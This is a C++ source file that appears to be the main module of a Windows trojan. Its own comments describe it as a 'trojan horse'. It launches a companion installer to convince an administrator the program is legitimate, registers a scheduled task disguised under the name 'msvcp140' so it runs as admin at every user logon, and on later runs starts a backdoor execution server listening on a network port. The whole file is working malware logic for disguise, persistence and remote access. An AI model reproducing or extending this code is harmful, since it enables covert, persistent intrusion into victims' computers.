#include <error_message_macro.hpp>
#include <AdminCheck.hpp>
#include <PathToCurrentExecutable.hpp>
#include <AdminStartupItem.hpp>
#include <CombaseLibrary.hpp>
#include <BackdoorExecution.hpp>
#include <SharedConstants.hpp>

#include <fstream>
#include <ios>
#include <iomanip>

#include <stdexcept>
#include <exception>
#include <sstream>
#include <type_traits>
#include <string_view>
#include <chrono>
#include <filesystem>
#include <cstdlib>

#include <csignal>

static constexpr std::wstring_view g_task_name{ L"msvcp140" };

static volatile std::sig_atomic_t g_program_is_stopping = false;

static void SignalHandler(int signal)
{
    g_program_is_stopping = true;
}

static std::filesystem::path GetFolderOfCurrentExecutable(std::filesystem::path full_path_to_current_executable)
{
    return full_path_to_current_executable.remove_filename();
}

static void LogToFile(const std::string_view message)
{
    const std::filesystem::path log_path = GetFolderOfCurrentExecutable(PathToCurrentExecutable{}.GetPath()) / std::filesystem::path{ "msvcp140_log.txt" };
    std::ofstream log_file{ log_path.string(), std::ios::binary | std::ios::app };
    // Print the precise data and time
    const auto now = std::chrono::system_clock::now();
    const auto now_c = std::chrono::system_clock::to_time_t(now);
    log_file << std::put_time(std::localtime(&now_c), "%Y-%m-%d %X") << "-$$$- ";
    log_file << message << "\n";
}

static void RunOtherExecutableInCurrentWorkingDirectory(std::filesystem::path path_to_current_executable)
{
    const std::filesystem::path containing_folder = GetFolderOfCurrentExecutable(path_to_current_executable);
    // Run all executables in the folder, except for the current executable, after asserting
    // that there's only 1 other executable in the folder
    const std::filesystem::path filename_of_current_executable = path_to_current_executable.filename();
    const auto for_each_executable = [containing_folder, filename_of_current_executable](auto&& callback)
    {
        for (const auto& entry : std::filesystem::directory_iterator{ containing_folder })
        {
            if (entry.is_regular_file() && entry.path().filename() != filename_of_current_executable)
            {
                callback(entry.path());
            }
        }
    };
    std::ptrdiff_t num_executables = 0;
    for_each_executable([&num_executables](const std::filesystem::path& executable_path) -> void {
        ++num_executables;
    });
    if (num_executables != 1)
    {
        std::ostringstream err_msg;
        err_msg << "There must be exactly 1 other executable in the folder, but there are " << num_executables;
        throw std::runtime_error{ ERROR_MESSAGE(err_msg.str()) };
    }
    for_each_executable([](const std::filesystem::path& executable_path) -> void {
        std::ostringstream ss_log;
        ss_log << "Found another executable in the folder: " << executable_path.string() << " running it as admin";
        LogToFile(ss_log.str());
        // Run the executable using std::system
        const std::string command = "start \"" + executable_path.string() + "\"";
        std::system(command.c_str());
    });
}

static void RegisterTaskMode()
{
    std::filesystem::path path_to_current_executable{ PathToCurrentExecutable{}.GetPath() };
    RunOtherExecutableInCurrentWorkingDirectory(path_to_current_executable);
    // Now after convincing the admin that they ran an installer to a legit program,
    // we can tell the task scheduler to run this trojan horse as admin every time any user logs in.
    AdminStartupItem{}.Create(path_to_current_executable.wstring(), g_task_name);
    LogToFile("Created startup item successfully\n");
}

static void RunBackdoorMode()
{
    // Start the backdoor execution server
    BackdoorExecution{}.Serve(
        g_program_is_stopping,
        g_port_number,
        g_public_key);
}

int main()
{
    // HANDLE CTRL+C and CTRL+Break (and kill in Linux)
    std::signal(SIGINT, SignalHandler);
    std::signal(SIGTERM, SignalHandler);

    try
    {
        if (!AdminCheck{}.IsAdmin())
        {
            throw std::runtime_error{ ERROR_MESSAGE("Program must be run as administrator") };   
        }
        LogToFile("Program is running as administrator\n");

        CombaseLibrary combase_library{};

        if (AdminStartupItem{}.Exists(g_task_name))
        {
            LogToFile("Startup item already exists, running backdoor\n");
            RunBackdoorMode();
            return 0;
        }
        else
        {
            LogToFile("Startup item does not exist, pretending to be a different installer and then starting all executables in current directory as admin\n");
            RegisterTaskMode();
        }
    }
    catch (std::exception& e)
    {
        std::ostringstream err_msg;
        err_msg << "Exception in main: " << e.what() << "\n";
        LogToFile(err_msg.str());   
    }
    return 0;
}
